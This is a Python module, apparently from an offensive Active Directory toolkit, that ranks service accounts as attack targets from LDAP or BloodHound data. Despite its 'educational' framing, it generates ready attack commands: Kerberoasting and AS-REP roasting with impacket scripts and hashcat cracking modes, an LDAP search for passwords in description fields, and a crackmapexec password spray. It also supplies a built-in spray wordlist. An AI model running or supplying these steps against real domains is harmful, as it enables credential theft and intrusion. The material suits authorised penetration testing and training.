"""
Service Account Analyzer

Identifies and prioritizes service accounts for attack targeting.
Service accounts are high-value targets because they often have:
- Privileged access (run services, scheduled tasks)
- Weak/shared passwords
- Kerberoastable SPNs
- No lockout policies

Educational purpose: Teaches why service accounts are primary targets
and how to identify them from enumeration data.

Example:
    analyzer = ServiceAccountAnalyzer()

    # From LDAP enumeration
    results = analyzer.analyze_from_users(users_list)
    for account in results.high_priority:
        print(f"{account.name}: {account.attack_suggestion}")

    # From BloodHound
    results = analyzer.analyze_from_bloodhound(neo4j_session)
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set
import re


class AccountPriority(Enum):
    """Priority level for targeting."""
    CRITICAL = "critical"  # Immediate target (DA access, Kerberoastable)
    HIGH = "high"          # Strong target (privileged access)
    MEDIUM = "medium"      # Worth investigating
    LOW = "low"            # Background consideration


class AttackVector(Enum):
    """Potential attack vectors for service accounts."""
    KERBEROAST = "kerberoast"      # Has SPN
    ASREP_ROAST = "asrep_roast"    # Pre-auth disabled
    PASSWORD_SPRAY = "password_spray"  # Weak password likely
    PASSWORD_IN_DESC = "password_in_desc"  # Password in description
    DELEGATION = "delegation"      # Constrained/unconstrained delegation
    GMSA_READABLE = "gmsa_readable"  # gMSA password readable


@dataclass
class ServiceAccountInfo:
    """
    Information about a detected service account.

    Contains identification, priority, and attack suggestions.
    """
    name: str
    domain: Optional[str] = None
    priority: AccountPriority = AccountPriority.MEDIUM
    patterns_matched: List[str] = field(default_factory=list)
    attack_vectors: List[AttackVector] = field(default_factory=list)
    attack_suggestion: str = ""
    educational_note: str = ""

    # Properties from enumeration
    description: str = ""
    has_spn: bool = False
    preauth_disabled: bool = False
    password_never_expires: bool = False
    admin_count: bool = False
    delegation_type: str = ""

    @property
    def upn(self) -> str:
        if self.domain:
            return f"{self.name}@{self.domain}"
        return self.name


@dataclass
class AnalysisResult:
    """
    Results from service account analysis.

    Groups accounts by priority and provides next steps.
    """
    critical: List[ServiceAccountInfo] = field(default_factory=list)
    high: List[ServiceAccountInfo] = field(default_factory=list)
    medium: List[ServiceAccountInfo] = field(default_factory=list)
    low: List[ServiceAccountInfo] = field(default_factory=list)

    next_steps: List[Dict[str, str]] = field(default_factory=list)

    @property
    def all_accounts(self) -> List[ServiceAccountInfo]:
        return self.critical + self.high + self.medium + self.low

    @property
    def high_priority(self) -> List[ServiceAccountInfo]:
        """Critical + High priority accounts."""
        return self.critical + self.high

    def add(self, account: ServiceAccountInfo):
        """Add account to appropriate priority bucket."""
        if account.priority == AccountPriority.CRITICAL:
            self.critical.append(account)
        elif account.priority == AccountPriority.HIGH:
            self.high.append(account)
        elif account.priority == AccountPriority.MEDIUM:
            self.medium.append(account)
        else:
            self.low.append(account)


class ServiceAccountAnalyzer:
    """
    Analyzes enumeration data to identify service accounts.

    Uses naming patterns, account properties, and BloodHound data
    to find and prioritize service account targets.
    """

    # === Naming patterns (compiled regex) ===

    # Strong service account indicators
    SERVICE_PATTERNS = [
        (r'^svc[-_]', 'svc- prefix'),
        (r'^sa[-_]', 'sa- prefix'),
        (r'^srv[-_]', 'srv- prefix'),
        (r'service$', '-service suffix'),
        (r'^sql', 'SQL service'),
        (r'^iis[-_]?', 'IIS service'),
        (r'^backup', 'backup service'),
        (r'^batch', 'batch job'),
        (r'^sched', 'scheduler'),
        (r'^task', 'task account'),
        (r'^job[-_]', 'job account'),
        (r'_svc$', '_svc suffix'),
        (r'_sa$', '_sa suffix'),
    ]

    # Technology-specific patterns (often Kerberoastable)
    TECH_PATTERNS = [
        (r'mssql', 'MSSQL service'),
        (r'mysql', 'MySQL service'),
        (r'oracle', 'Oracle service'),
        (r'postgres', 'PostgreSQL service'),
        (r'mongo', 'MongoDB service'),
        (r'redis', 'Redis service'),
        (r'elastic', 'Elasticsearch'),
        (r'tomcat', 'Tomcat service'),
        (r'apache', 'Apache service'),
        (r'nginx', 'Nginx service'),
        (r'exchange', 'Exchange service'),
        (r'sharepoint', 'SharePoint service'),
        (r'lync|skype', 'Lync/Skype service'),
        (r'sccm|mecm', 'SCCM/MECM service'),
        (r'scom', 'SCOM service'),
        (r'adfs', 'ADFS service'),
        (r'azure', 'Azure service'),
        (r'sync', 'Sync service'),
    ]

    # Administrative service patterns
    ADMIN_PATTERNS = [
        (r'admin', 'admin keyword'),
        (r'root', 'root keyword'),
        (r'priv', 'privileged keyword'),
        (r'super', 'super keyword'),
    ]

    def __init__(self):
        # Compile patterns
        self._service_regex = [
            (re.compile(p, re.IGNORECASE), desc)
            for p, desc in self.SERVICE_PATTERNS
        ]
        self._tech_regex = [
            (re.compile(p, re.IGNORECASE), desc)
            for p, desc in self.TECH_PATTERNS
        ]
        self._admin_regex = [
            (re.compile(p, re.IGNORECASE), desc)
            for p, desc in self.ADMIN_PATTERNS
        ]

    def analyze_from_users(
        self,
        users: List[Dict[str, Any]],
        context: Optional[Dict[str, str]] = None,
    ) -> AnalysisResult:
        """
        Analyze user list from LDAP enumeration.

        Args:
            users: List of user dicts (name, description, etc.)
            context: Optional context (domain, etc.)

        Returns:
            AnalysisResult with prioritized accounts
        """
        context = context or {}
        result = AnalysisResult()

        for user in users:
            name = user.get('name', '')
            if not name:
                continue

            account = self._analyze_single(user, context)
            if account:
                result.add(account)

        # Add next steps based on findings
        result.next_steps = self._generate_next_steps(result, context)

        return result

    def _analyze_single(
        self,
        user: Dict[str, Any],
        context: Dict[str, str],
    ) -> Optional[ServiceAccountInfo]:
        """
        Analyze a single user for service account indicators.

        Returns ServiceAccountInfo if patterns match, None otherwise.
        """
        name = user.get('name', '')
        description = user.get('description', '')

        patterns_matched = []
        attack_vectors = []
        priority_score = 0

        # Check naming patterns
        for regex, desc in self._service_regex:
            if regex.search(name):
                patterns_matched.append(desc)
                priority_score += 20

        for regex, desc in self._tech_regex:
            if regex.search(name):
                patterns_matched.append(desc)
                priority_score += 25  # Tech services often Kerberoastable

        for regex, desc in self._admin_regex:
            if regex.search(name):
                patterns_matched.append(desc)
                priority_score += 15

        # No patterns matched - not a service account
        if not patterns_matched:
            return None

        # Create account info
        account = ServiceAccountInfo(
            name=name,
            domain=context.get('domain', user.get('domain')),
            patterns_matched=patterns_matched,
            description=description,
        )

        # Check for attack vectors from user properties

        # SPN -> Kerberoastable
        spn = user.get('spn') or user.get('serviceprincipalname')
        if spn:
            account.has_spn = True
            attack_vectors.append(AttackVector.KERBEROAST)
            priority_score += 40
            account.attack_suggestion = "Kerberoastable - extract TGS and crack offline"

        # Pre-auth disabled -> AS-REP roast
        preauth = user.get('dontreqpreauth') or user.get('asreproastable')
        if preauth:
            account.preauth_disabled = True
            attack_vectors.append(AttackVector.ASREP_ROAST)
            priority_score += 35
            if not account.attack_suggestion:
                account.attack_suggestion = "AS-REP roastable - no pre-auth required"

        # Password in description
        if description and self._check_password_in_description(description):
            attack_vectors.append(AttackVector.PASSWORD_IN_DESC)
            priority_score += 50
            account.attack_suggestion = "PASSWORD IN DESCRIPTION - check immediately!"

        # Admin count (privileged)
        if user.get('admincount'):
            account.admin_count = True
            priority_score += 20

        # Password never expires
        if user.get('pwdneverexpires'):
            account.password_never_expires = True
            priority_score += 10

        # Delegation
        delegation = user.get('msds-allowedtodelegateto') or user.get('trustedfordelegation')
        if delegation:
            account.delegation_type = "constrained" if 'allowedto' in str(user.keys()).lower() else "unconstrained"
            attack_vectors.append(AttackVector.DELEGATION)
            priority_score += 30

        # Default attack suggestion if none set
        if not account.attack_suggestion:
            account.attack_suggestion = "Password spray with common service passwords"
            attack_vectors.append(AttackVector.PASSWORD_SPRAY)

        account.attack_vectors = attack_vectors

        # Determine priority from score
        if priority_score >= 70:
            account.priority = AccountPriority.CRITICAL
        elif priority_score >= 50:
            account.priority = AccountPriority.HIGH
        elif priority_score >= 30:
            account.priority = AccountPriority.MEDIUM
        else:
            account.priority = AccountPriority.LOW

        # Educational note
        account.educational_note = self._get_educational_note(account)

        return account

    def _check_password_in_description(self, description: str) -> bool:
        """Check if description likely contains a password."""
        password_indicators = [
            r'password\s*[:=]',
            r'pwd\s*[:=]',
            r'pass\s*[:=]',
            r'p/w\s*[:=]',
            r'secret\s*[:=]',
            r'cred\s*[:=]',
        ]

        desc_lower = description.lower()
        return any(re.search(p, desc_lower) for p in password_indicators)

    def _get_educational_note(self, account: ServiceAccountInfo) -> str:
        """Generate educational note explaining why this is a target."""
        notes = []

        if AttackVector.KERBEROAST in account.attack_vectors:
            notes.append(
                "Kerberoasting: Service accounts with SPNs allow any authenticated "
                "user to request a TGS ticket encrypted with the account's password. "
                "The ticket can be cracked offline without triggering alerts."
            )

        if AttackVector.ASREP_ROAST in account.attack_vectors:
            notes.append(
                "AS-REP Roasting: Accounts without pre-authentication can have their "
                "encrypted timestamp requested and cracked offline, similar to Kerberoasting "
                "but requires no prior authentication."
            )

        if AttackVector.PASSWORD_IN_DESC in account.attack_vectors:
            notes.append(
                "Password in Description: Administrators sometimes store service account "
                "passwords in the AD description field for 'convenience'. This is readable "
                "by any authenticated domain user via LDAP."
            )

        if AttackVector.DELEGATION in account.attack_vectors:
            notes.append(
                f"{account.delegation_type.title()} Delegation: This account can impersonate "
                "other users to specific services. Compromising it may allow attacking "
                "services the account is trusted to delegate to."
            )

        if not notes:
            notes.append(
                "Service accounts often have weak, reused, or default passwords. "
                "They're created for automation and may bypass lockout policies."
            )

        return " | ".join(notes)

    def _generate_next_steps(
        self,
        result: AnalysisResult,
        context: Dict[str, str],
    ) -> List[Dict[str, str]]:
        """Generate next step suggestions based on findings."""
        steps = []
        target = context.get('target_ip', '<DC_IP>')
        domain = context.get('domain', '<DOMAIN>')

        # Kerberoastable accounts
        kerberoastable = [
            a for a in result.all_accounts
            if AttackVector.KERBEROAST in a.attack_vectors
        ]
        if kerberoastable:
            names = ', '.join(a.name for a in kerberoastable[:3])
            steps.append({
                "action": f"Kerberoast {len(kerberoastable)} service account(s)",
                "command": f"GetUserSPNs.py {domain}/<USER>:<PASS> -dc-ip {target} -request",
                "explanation": f"Request TGS for: {names}. Crack with hashcat -m 13100.",
                "priority": "1",
            })

        # AS-REP roastable
        asreproast = [
            a for a in result.all_accounts
            if AttackVector.ASREP_ROAST in a.attack_vectors
        ]
        if asreproast:
            steps.append({
                "action": f"AS-REP roast {len(asreproast)} account(s)",
                "command": f"GetNPUsers.py {domain}/ -dc-ip {target} -usersfile users.txt -format hashcat",
                "explanation": "Extract AS-REP hashes for accounts without pre-auth. Crack with hashcat -m 18200.",
                "priority": "1",
            })

        # Password in description
        pwd_in_desc = [
            a for a in result.all_accounts
            if AttackVector.PASSWORD_IN_DESC in a.attack_vectors
        ]
        if pwd_in_desc:
            steps.append({
                "action": f"Check {len(pwd_in_desc)} description(s) for passwords",
                "command": f"ldapsearch -x -H ldap://{target} -D '<USER>@{domain}' -w '<PASS>' -b 'DC=...' '(description=*pass*)' description",
                "explanation": "Password found in AD description field - easy win!",
                "priority": "0",  # Highest
            })

        # Password spray high-priority accounts
        if result.high_priority:
            accounts = [a.name for a in result.high_priority[:5]]
            steps.append({
                "action": "Spray service accounts with common passwords",
                "command": f"crackmapexec smb {target} -u svc_accounts.txt -p common_svc_passwords.txt --continue-on-success",
                "explanation": f"Try: Password1, Welcome1, ServiceName123, {domain}2024. Target: {', '.join(accounts)}",
                "priority": "2",
            })

        # Document for tracking
        steps.append({
            "action": "Add service accounts to bloodtrail tracking",
            "command": "# bloodtrail --add-targets <service_accounts.txt>",
            "explanation": "Track service accounts for attack path analysis and credential correlation.",
            "priority": "99",
        })

        return steps

    def analyze_from_bloodhound(
        self,
        neo4j_session,
        context: Optional[Dict[str, str]] = None,
    ) -> AnalysisResult:
        """
        Analyze service accounts from BloodHound Neo4j data.

        Args:
            neo4j_session: Active Neo4j session
            context: Optional context

        Returns:
            AnalysisResult with prioritized accounts
        """
        context = context or {}
        result = AnalysisResult()

        # Query for Kerberoastable users
        query_kerberoast = """
        MATCH (u:User)
        WHERE u.hasspn = true
        RETURN u.name AS name,
               u.description AS description,
               u.admincount AS admincount,
               u.enabled AS enabled
        """

        # Query for AS-REP roastable
        query_asrep = """
        MATCH (u:User)
        WHERE u.dontreqpreauth = true
        RETURN u.name AS name,
               u.description AS description,
               u.admincount AS admincount
        """

        # Query for service account patterns
        query_svc = """
        MATCH (u:User)
        WHERE u.name =~ '(?i).*(svc|service|sql|backup|batch|job|sa_).*'
        RETURN u.name AS name,
               u.description AS description,
               u.hasspn AS hasspn,
               u.dontreqpreauth AS dontreqpreauth,
               u.admincount AS admincount
        """

        try:
            # Kerberoastable
            for record in neo4j_session.run(query_kerberoast):
                user = dict(record)
                user['spn'] = True  # Mark as having SPN
                account = self._analyze_single(user, context)
                if account:
                    result.add(account)

            # AS-REP roastable
            for record in neo4j_session.run(query_asrep):
                user = dict(record)
                user['dontreqpreauth'] = True
                account = self._analyze_single(user, context)
                if account and account.name not in [a.name for a in result.all_accounts]:
                    result.add(account)

            # Service account patterns
            for record in neo4j_session.run(query_svc):
                user = dict(record)
                account = self._analyze_single(user, context)
                if account and account.name not in [a.name for a in result.all_accounts]:
                    result.add(account)

        except Exception as e:
            pass

        result.next_steps = self._generate_next_steps(result, context)
        return result

    def get_spray_wordlist(self, domain: str = "") -> List[str]:
        """
        Generate password wordlist for service account spraying.

        Returns common service account passwords based on domain.
        """
        base = [
            "Password1", "Password123", "Password!",
            "Welcome1", "Welcome123", "Welcome!",
            "Service1", "Service123",
            "Summer2024", "Winter2024", "Spring2024", "Fall2024",
            "Admin123", "Admin!",
            "P@ssw0rd", "P@ssword1",
            "Changeme1", "Changeme!",
        ]

        if domain:
            # Add domain-specific passwords
            domain_base = domain.split('.')[0].capitalize()
            base.extend([
                f"{domain_base}1",
                f"{domain_base}123",
                f"{domain_base}!",
                f"{domain_base}2024",
                f"{domain_base}@123",
            ])

        return base

    def get_report(self, result: AnalysisResult) -> str:
        """Generate human-readable service account report."""
        lines = [
            "=" * 60,
            "SERVICE ACCOUNT ANALYSIS",
            "=" * 60,
            "",
            f"Critical: {len(result.critical)}",
            f"High:     {len(result.high)}",
            f"Medium:   {len(result.medium)}",
            f"Low:      {len(result.low)}",
            "",
        ]

        if result.critical:
            lines.append("-" * 40)
            lines.append("CRITICAL PRIORITY (Immediate Targets)")
            lines.append("-" * 40)
            for acc in result.critical:
                lines.append(f"\n  {acc.name}")
                lines.append(f"    Patterns: {', '.join(acc.patterns_matched)}")
                lines.append(f"    Vectors:  {', '.join(v.value for v in acc.attack_vectors)}")
                lines.append(f"    Action:   {acc.attack_suggestion}")

        if result.high:
            lines.append("\n" + "-" * 40)
            lines.append("HIGH PRIORITY")
            lines.append("-" * 40)
            for acc in result.high:
                lines.append(f"\n  {acc.name}: {acc.attack_suggestion}")

        if result.next_steps:
            lines.append("\n" + "=" * 40)
            lines.append("RECOMMENDED NEXT STEPS")
            lines.append("=" * 40)
            for step in sorted(result.next_steps, key=lambda s: s.get('priority', '99')):
                lines.append(f"\n  [{step['priority']}] {step['action']}")
                lines.append(f"      $ {step['command']}")

        lines.append("")
        return "\n".join(lines)
